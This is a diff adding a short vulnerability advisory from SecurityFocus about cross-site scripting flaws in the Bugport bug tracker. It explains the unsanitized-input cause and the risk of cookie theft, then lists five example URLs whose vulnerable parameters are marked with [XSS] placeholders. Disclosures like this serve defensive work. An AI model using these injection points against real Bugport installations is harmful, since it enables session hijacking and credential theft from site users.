@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/16123/info
+
+Bugport is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/index.php?view=AddToFavoriteItemSetView&ids%5B0%5D=[XSS]
+http://www.example.com/index.php?view=AddRelatedDevelopmentItemFormView&report_id=9&action=[XSS]
+http://www.example.com/index.php?view=AddRelatedDevelopmentItemFormView&report_id=[XSS]
+http://www.example.com/index.php?view=DevelopmentItemResultsView&devWherePair%5B0%5D=state_id+%3C+%3F++AND++MATCH+%28report%2Csubject%2Cdevelplan%2Cfixednotes%2Crepsteps%29+AGAINST+%28%3F++IN+BOOLEAN+MODE%29&devWherePair%5B1%5D%5B0%5D=240&devWherePair%5B1%5D%5B1%5D=[XSS]
+http://www.example.com/index.php?view=DevelopmentItemResultsView&where=project_id+%3D+%3F&orderBy=priority_id+DESC&binds%5B0%5D=[XSS] 
